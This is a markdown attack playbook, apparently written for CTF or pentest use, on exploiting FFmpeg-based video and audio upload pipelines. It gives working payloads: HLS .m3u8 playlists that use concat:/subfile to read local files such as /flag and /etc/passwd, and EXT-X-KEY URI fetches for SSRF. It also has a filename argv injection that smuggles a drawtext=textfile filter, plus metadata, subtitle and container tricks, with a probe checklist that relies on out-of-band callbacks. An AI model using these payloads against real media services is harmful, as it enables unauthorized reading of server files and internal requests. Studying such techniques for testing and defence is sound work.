# Video / Audio Attacks — FFmpeg, HLS, metadata, and delegates

## The processor — FFmpeg is the usual sink

`.avi`/`.mp4`/`.mkv`/`.wav`/`.mp3` uploads that get thumbnailed, transcoded,
or previewed hit FFmpeg (`ffmpeg`/`ffprobe`/PHP-FFMpeg/ffmpeg-static/node).
FFmpeg's demuxer graph is a huge attack surface: protocol openers in
playlists, filter eval, subtitle parsers.

## HLS playlist — `.m3u8` as an upload

The classic FFmpeg HLS chain (CVE-2017-9993 family and its CTF variants):
an `.m3u8` upload whose `EXT-X-` directives point FFmpeg at local files or
internal URLs:

```m3u8
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://localhost/flag|subfile,,start,0,end,64
#EXT-X-ENDLIST
```

If the app transcodes/probes it, FFmpeg opens `concat:` → the subfile reads
`/flag`-equivalent bytes into the media stream — the output thumbnail/audio
carries the content, or the probe errors leak it.

Variants:

```m3u8
#EXTM3U
#EXT-X-KEY:METHOD=AES-128,URI="file:///etc/passwd"
#EXTINF:1,
x.ts
```

`URI=` on `EXT-X-KEY`, `EXT-X-MAP`, `EXT-X-SESSION-DATA` all fetch — SSRF.

`concat:` `subfile,,start,N,end,M` slices a local file — exfil a fixed
window into the transcoded output.

## Subtitle/sidecar files — `.srt`/`.vtt`/`.ass`

- `.ass`/`ASS` format `Dialogue:` lines + `\pos`/`Styles` — parsers render
  text into the output; `file:`/fontconfig side effects
- `.vtt`/`.srt` text rendered into thumbnails — a content-injection
  channel into a generated image
- subtitle fetch — `URI` refs in WebVTT headers

## Metadata — artist/album/comment fields

- ffmpeg `-metadata` writes tags — tags that echo back through the app's
  "track info" endpoint or the container's `icy`/`id3` fields
- `exiftool`-processed tags — same ExifTool CVE-2021-22204 surface as
  images if the pipeline calls `exiftool` on media
- cover-art attachments inside `.mp3` (APIC frame) — an embedded JPEG
  reaching an image pipeline → `image-attacks.md`

## The `lavfi`/`filter` graph — when a filename reaches a filter arg

`filename='x.avi -vf "drawtext=textfile=/flag:x=0:y=0"'` — argv injection
through the filename (same family as `magicom`); also FFmpeg `lavfi`
virtual inputs: `movie=`/`amovie=`/`text=`/`textfile=` filters reading
local files into the output.

## MP4/MOV — `ftyp` box games

- `ftyp` brand sniffing is prefix-grade — `....ftyp` + payload tail
- `moov`/`udta` boxes carry metadata — inject into parsed fields
- fragmented MP4 `sidx`/`styp` — parser edge cases

## WAV/RIFF — `LIST`/`INFO` chunks

`RIFF` + `WAVE` + `LIST INFO` chunks carry `INAM`/`ICMT`/`IART` — metadata
fields a parser echoes; the audio body is free bytes.

## Delegates — what FFmpeg calls

- `concat:`, `subfile`, `http(s):`, `file:`, `crypto:`, `pipe:` protocols
  inside playlist/demuxer input — the `protocol_whitelist` matters; on a
  default build `file,crypto,concat,subfile,http,tcp,tls` are enabled
- libass/libavfilter — subtitle render
- ImageMagick for thumbnails — chained

## Probe table

```
□ does an .m3u8 upload get parsed? (error text/convert behavior)
□ does ffmpeg fetch the URI= refs? (oob_listener callback)
□ is concat: enabled? (error mentioning concat/protocol whitelist)
□ does .ass/.srt text surface in a generated thumbnail?
□ does the filename reach a command line? (argv echo in error)
```

## Falsifiers

- the app stores media bytes only — no transcode/thumbnail/probe
- FFmpeg runs with `-protocol_whitelist` tight (no file/concat/subfile)
  and no filter argv reach
- no media pipeline at all — pivot elsewhere

## Output to record

- the demuxer/protocol that fired + the verbatim output or OOB hit
- whether content lands in the transcoded artifact (read back via the
  generated file)
